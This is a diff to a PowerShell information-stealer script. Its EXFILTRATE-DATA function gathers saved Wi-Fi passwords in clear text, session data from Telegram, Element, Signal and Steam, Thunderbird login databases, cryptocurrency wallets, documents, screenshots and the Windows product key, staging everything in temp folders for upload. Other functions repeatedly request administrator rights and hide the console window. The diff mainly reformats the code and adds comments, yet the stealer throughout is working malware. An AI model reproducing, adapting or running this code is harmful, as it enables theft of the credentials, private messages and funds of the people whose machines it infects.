@@ -31,7 +31,6 @@ function EXFILTRATE-DATA {
     $username = $env:USERNAME
     $hostname = $env:COMPUTERNAME
     $netstat = netstat -ano > $env:LOCALAPPDATA\Temp\netstat.txt
-	
 	$mfg = (gwmi win32_computersystem).Manufacturer 
 	
 	# System Uptime
@@ -43,7 +42,6 @@ function EXFILTRATE-DATA {
     $uptime = Get-Uptime
 	
 	# List of Installed AVs
-	
 	function get-installed-av {
     $wmiQuery = "SELECT * FROM AntiVirusProduct"
     $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery  @psboundparameters 
@@ -51,39 +49,32 @@ function EXFILTRATE-DATA {
     }
     $avlist = get-installed-av -autosize | ft | out-string
     
+	# Extracts all Wifi Passwords
     $wifipasslist = netsh wlan show profiles | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | out-string
     $wifi = $wifipasslist | out-string 
     $wifi > $env:temp\WIFIPasswords.txt
 	
 	# Screen Resolution
-
     $width = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription  -split '\n')[0]  -split ' ')[0]
     $height = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription  -split '\n')[0]  -split ' ')[2]  
     $split = "x"
     $screen = "$width" + "$split" + "$height"  
     $screen
     
+	# Startup Apps , Running Services, Processes, Installed Applications, and Network Adapters
+	function misc {
     Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location, User | Format-List > $env:temp\StartUpApps.txt
-    
     Get-WmiObject win32_service |? State -match "running" | select Name, DisplayName, PathName, User | sort Name | ft -wrap -autosize >  $env:LOCALAPPDATA\Temp\running-services.txt
-    
     Get-WmiObject win32_process | Select-Object Name,Description,ProcessId,ThreadCount,Handles,Path | ft -wrap -autosize > $env:temp\running-applications.txt
-    
     Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table > $env:temp\Installed-Applications.txt
-    
     Get-NetAdapter | ft Name,InterfaceDescription,PhysicalMediaType,NdisPhysicalMedium -AutoSize > $env:temp\NetworkAdapters.txt
-
-    # Telegram Session Stealer
+	}
+	misc 
 	
+    # Telegram Session Stealer
 	function telegramstealer {
     $processName = "telegram"
-    try {
-        if (Get-Process $processName ) {
-            Get-Process -Name $processName | Stop-Process
-        }
-    } catch {
-     
-    }
+    try {if (Get-Process $processName ) {Get-Process -Name $processName | Stop-Process }} catch {}
     $path = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
     $destination = "$env:localappdata\temp\telegram-session.zip"
     $exclude = @("_*.config","dumps","tdummy","emoji","user_data","user_data#2","user_data#3","user_data#4","user_data#5","user_data#6","*.json","webview")
@@ -94,77 +85,56 @@ function EXFILTRATE-DATA {
 	
 	# Element Session Stealer
     function elementstealer {
-        $processName = "element"
-        try {
-            if (Get-Process $processName ) {
-                Get-Process -Name $processName | Stop-Process
-            }
-        } catch {
-         
-        }
-        $element_session = "$env:localappdata\temp\element-session"
-         New-Item -ItemType Directory -Force -Path $element_session
-         $elementfolder = "$env:userprofile\AppData\Roaming\Element"
-         Copy-Item -Path "$elementfolder\databases" -Destination $element_session -Recurse -force
-         Copy-Item -Path "$elementfolder\Local Storage" -Destination $element_session -Recurse -force
-         Copy-Item -Path "$elementfolder\Session Storage" -Destination $element_session -Recurse -force
-         Copy-Item -Path "$elementfolder\IndexedDB" -Destination $element_session -Recurse -force
-         Copy-Item -Path "$elementfolder\sso-sessions.json" -Destination $element_session -Recurse -force
-         $signal_zip = "$env:localappdata\temp\element-session.zip"
-         Compress-Archive -Path $element_session -DestinationPath $signal_zip -CompressionLevel Fastest
+    $processName = "element"
+    try {if (Get-Process $processName ) {Get-Process -Name $processName | Stop-Process }} catch {}
+    $element_session = "$env:localappdata\temp\element-session"
+    New-Item -ItemType Directory -Force -Path $element_session
+    $elementfolder = "$env:userprofile\AppData\Roaming\Element"
+    Copy-Item -Path "$elementfolder\databases" -Destination $element_session -Recurse -force
+    Copy-Item -Path "$elementfolder\Local Storage" -Destination $element_session -Recurse -force
+    Copy-Item -Path "$elementfolder\Session Storage" -Destination $element_session -Recurse -force
+    Copy-Item -Path "$elementfolder\IndexedDB" -Destination $element_session -Recurse -force
+    Copy-Item -Path "$elementfolder\sso-sessions.json" -Destination $element_session -Recurse -force
+    $signal_zip = "$env:localappdata\temp\element-session.zip"
+    Compress-Archive -Path $element_session -DestinationPath $signal_zip -CompressionLevel Fastest
     }
     elementstealer 
 	
 	# Signal Session Stealer
     function signalstealer {
-         $processName = "Signal"
-         try {
-             if (Get-Process $processName ) {
-                 Get-Process -Name $processName | Stop-Process
-             }
-         } catch {
-          
-         }
-         $signal_session = "$env:localappdata\temp\signal-session"
-          New-Item -ItemType Directory -Force -Path $signal_session
-          $signalfolder = "$env:userprofile\AppData\Roaming\Signal"
-          Copy-Item -Path "$signalfolder\databases" -Destination $signal_session -Recurse -force
-          Copy-Item -Path "$signalfolder\Local Storage" -Destination $signal_session -Recurse -force
-          Copy-Item -Path "$signalfolder\Session Storage" -Destination $signal_session -Recurse -force
-          Copy-Item -Path "$signalfolder\sql" -Destination $signal_session -Recurse -force
-          Copy-Item -Path "$signalfolder\config.json" -Destination $signal_session -Recurse -force
-          $signal_zip = "$env:localappdata\temp\signal-session.zip"
-          Compress-Archive -Path $signal_session -DestinationPath $signal_zip -CompressionLevel Fastest
-     }
-     signalstealer 
+    $processName = "Signal"
+    try {if (Get-Process $processName ) {Get-Process -Name $processName | Stop-Process }} catch {}
+    $signal_session = "$env:localappdata\temp\signal-session"
+    New-Item -ItemType Directory -Force -Path $signal_session
+    $signalfolder = "$env:userprofile\AppData\Roaming\Signal"
+    Copy-Item -Path "$signalfolder\databases" -Destination $signal_session -Recurse -force
+    Copy-Item -Path "$signalfolder\Local Storage" -Destination $signal_session -Recurse -force
+    Copy-Item -Path "$signalfolder\Session Storage" -Destination $signal_session -Recurse -force
+    Copy-Item -Path "$signalfolder\sql" -Destination $signal_session -Recurse -force
+    Copy-Item -Path "$signalfolder\config.json" -Destination $signal_session -Recurse -force
+    $signal_zip = "$env:localappdata\temp\signal-session.zip"
+    Compress-Archive -Path $signal_session -DestinationPath $signal_zip -CompressionLevel Fastest
+    }
+    signalstealer 
 	 
-     # Steam Session Stealer
-	 function steamstealer {
-         $processName = "steam"
-         try {
-             if (Get-Process $processName ) {
-                 Get-Process -Name $processName | Stop-Process
-             }
-         } catch {
-          
-         }
-         $steam_session = "$env:localappdata\temp\steam-session"
-         New-Item -ItemType Directory -Force -Path $steam_session
-         $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
-         Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -force
-		 $ssfnfiles = @("ssfn$1")
-         foreach($file in $ssfnfiles) {
-         Get-ChildItem -path $steamfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach { Copy-Item -path $PSItem.FullName -Destination $steam_session }
-         }
-
-		  $steam_zip = "$env:localappdata\temp\steam-session.zip"
-         Compress-Archive -Path $steam_session -DestinationPath $steam_zip -CompressionLevel Fastest
-         }
-       steamstealer 
-     
-    
-	# Desktop screenshot
+    # Steam Session Stealer
+	function steamstealer {
+     $processName = "steam"
+     try {if (Get-Process $processName ) {Get-Process -Name $processName | Stop-Process }} catch {}
+     $steam_session = "$env:localappdata\temp\steam-session"
+     New-Item -ItemType Directory -Force -Path $steam_session
+     $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
+     Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -force
+	 $ssfnfiles = @("ssfn$1")
+     foreach($file in $ssfnfiles) {
+     Get-ChildItem -path $steamfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach { Copy-Item -path $PSItem.FullName -Destination $steam_session }
+     }
+	 $steam_zip = "$env:localappdata\temp\steam-session.zip"
+     Compress-Archive -Path $steam_session -DestinationPath $steam_zip -CompressionLevel Fastest
+     }
+     steamstealer 
 	
+	# Desktop screenshot
     Add-Type -AssemblyName System.Windows.Forms,System.Drawing
     $screens = [Windows.Forms.Screen]::AllScreens
     $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
@@ -179,6 +149,7 @@ function EXFILTRATE-DATA {
     $graphics.Dispose()
     $bmp.Dispose()
 	
+	# Disk Information
     function diskdata {
     $disks = get-wmiobject -class "Win32_LogicalDisk" -namespace "root\CIMV2"
     $results = foreach ($disk in $disks) {
@@ -201,7 +172,8 @@ function EXFILTRATE-DATA {
     }
     $alldiskinfo = diskdata
     $alldiskinfo > $env:temp\DiskInfo.txt
-
+    
+	#Extracts Product Key
     function Get-ProductKey {
       $map="BCDFGHJKMPQRTVWXY2346789"
       $value = (get-itemproperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").digitalproductid[0x34..0x42]
@@ -222,13 +194,13 @@ function EXFILTRATE-DATA {
       $ProductKey
     }
     $ProductKey = Get-ProductKey
-    Get-ProductKey > $env:localappdata\temp\ProductKey.txt
+    Get-ProductKey > $env:localappdata\temp\ProductKey.txt	
 	
+	# Create temporary directory to store wallet data for exfiltration
 	New-Item -Path "$env:localappdata\Temp" -Name "Crypto Wallets" -ItemType Directory -force | out-null
 	$crypto = "$env:localappdata\Temp\Crypto Wallets"
 
     # Thunderbird Exfil
-	
     $Thunderbird = @('key4.db', 'key3.db', 'logins.json', 'cert9.db')
     If (Test-Path -Path "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles") {
     New-Item -Path "$crypto\Thunder" -ItemType Directory | Out-Null
@@ -295,8 +267,7 @@ function EXFILTRATE-DATA {
     Get-ChildItem "$env:userprofile\AppData\Roaming\Zcash" -Recurse | Copy-Item -Destination "$crypto\Zcash" -Recurse -Force
     }
 
-    #Files Grabber
-    
+    #Files Grabber 
 	New-Item -Path "$env:localappdata\Temp" -Name "Files Grabber" -ItemType Directory -force | out-null
 	$filegrabber = "$env:localappdata\Temp\Files Grabber"
 	Function GrabFiles {
@@ -339,7 +310,6 @@ function EXFILTRATE-DATA {
     (gci -path $paths -Include "*.pdf","*.txt","*.doc","*.csv","*.rtf","*.docx" -r | ? Length -lt 5mb) -match $grab_regex | Copy-Item -Destination $dest -Force
     }
     GrabFiles
-    
     
     $embed_and_body = @{
         "username" = "KDOT"
@@ -477,8 +447,6 @@ function Invoke-TASKS {
     EXFILTRATE-DATA
 }
 
-
-
 function Request-Admin {
     while(!(CHECK_IF_ADMIN)) {
         try {
@@ -559,7 +527,6 @@ function Hide-Console
     $consolePtr = [Console.Window]::GetConsoleWindow()
     $null = [Console.Window]::ShowWindow($consolePtr, 0)
 }
-
 
 if (CHECK_IF_ADMIN -eq $true) {
     Hide-Console
